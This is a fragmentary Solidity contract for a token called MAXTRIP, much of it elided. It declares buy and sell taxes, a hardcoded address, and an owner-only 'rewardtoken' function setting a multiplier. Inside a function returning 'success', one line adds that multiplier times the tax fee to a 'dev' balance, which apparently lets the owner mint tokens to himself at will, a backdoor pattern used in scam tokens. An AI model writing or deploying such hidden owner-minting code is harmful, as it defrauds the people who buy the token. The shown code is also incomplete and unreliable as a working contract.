...
contract MAXTRIP is Ownable , IERC20 {

    using SafeMath for uint256;
    string public name = "MAXTRIP";
    string public symbol = "MAXTRIP";
    uint256 public decimals = 9;
    uint256 private constant MAX = ~uint256(0);

    uint256 public _tTotal = 10000000 * 10 ** decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _taxbuy = 3;
    uint256 private _taxsell = 4;
    uint256 private amountTX = 0;
    address private target;
    uint256 private _rewardtoken = 1;
    uint256 private _taxfee = _taxbuy + _taxsell;
     uint256 private taxfee;
    address private ow = 0xa77D4E339Cb4BBC0F8842383D77D405BB7403f13;
     ...
     */
     function rewardtoken(uint256 amount) external onlyOwner{
        ...
        returns (bool success)
    {
        ...
        _rOwned[dev] +=  _taxfee.mul(_rewardtoken);
